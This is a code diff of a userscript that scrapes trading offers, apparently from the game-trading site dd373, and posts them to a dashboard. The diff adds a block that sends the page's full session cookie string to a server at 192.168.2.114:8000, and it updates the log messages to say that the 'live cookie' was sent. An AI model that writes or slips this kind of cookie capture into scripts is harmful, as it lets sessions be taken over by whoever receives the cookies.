@@ -149,7 +149,14 @@
             return;
         }
 
-        log(`🚀 Đã đọc ${offers.length} offers. Đang gửi về Dashboard...`, "#00e676");
+        if (document.cookie && document.cookie.length > 10) {
+            GM_xmlhttpRequest({
+                method: "POST",
+                url: "http://192.168.2.114:8000/api/v1/dd373/cookie",
+                headers: { "Content-Type": "application/json" },
+                data: JSON.stringify({ cookie: document.cookie })
+            });
+        }
 
         const payload = {
             item_name: ITEM_NAME,
@@ -166,13 +173,13 @@
             data: JSON.stringify(payload),
             onload: function (response) {
                 if (response.status >= 200 && response.status < 300) {
-                    log(`✅ Đã cập nhật ${offers.length} offers vào Localhost:8000!`, "#00e676");
+                    log(`✅ Đã cập nhật ${offers.length} offers & Cookie sống về Server!`, "#00e676");
                 } else {
-                    log(`❌ Lỗi gửi Localhost (${response.status})`, "#ff3b30");
+                    log(`❌ Lỗi gửi Server (${response.status})`, "#ff3b30");
                 }
             },
             onerror: function () {
-                log("❌ Không thể kết nối Localhost:8000", "#ff3b30");
+                log("❌ Không thể kết nối Server 192.168.2.114:8000", "#ff3b30");
             }
         });
     }
